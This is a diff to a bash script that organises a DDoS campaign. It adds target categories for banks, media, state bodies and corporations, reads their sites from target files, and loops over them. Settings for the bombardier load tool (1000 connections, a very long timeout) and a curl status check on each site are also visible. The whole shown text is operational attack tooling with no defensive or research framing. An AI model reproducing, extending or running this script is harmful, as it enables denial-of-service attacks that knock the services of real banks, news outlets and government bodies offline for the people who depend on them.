@@ -3,10 +3,36 @@
 BOMBARDIER_TIMEOUT=600000s
 BOMBARDIER_CONNECTIONS=1000
 
+categories=("banks" "media" "state" "corporations" "unsorted")
+category=$1
+
+if [ ! -f targets.txt ]
+then
+  touch targets.txt
+else
+  > targets.txt
+fi
+
+if [ $# -eq 0 ]
+then
+  echo "Run ddos for all sites"
+  cat targets/*.txt >> targets.txt
+else
+  if [[ " ${categories[@]} " =~ " ${category} " ]]; then
+    echo "Run ddos for $1"
+  else
+    echo "This category is not allowed. Choose from:"
+    printf '%s\n' "${categories[@]}"
+    exit 0
+  fi
+
+  cat targets/${category}.txt >> targets.txt
+fi
+
 sites=()
 while IFS= read -r line; do
   sites+=("$line")
-done < endpoints.txt
+done < targets.txt
 
 while :
 do
@@ -15,8 +41,6 @@ do
   docker stop $(docker ps -aq)
 
   echo "Docker containers stopped"
-
-  echo "Run ddos for all sites"
 
   for site in "${sites[@]}"; do
     status_code=$(curl -m 2 -o /dev/null -s -w "%{http_code}\n" "$site")
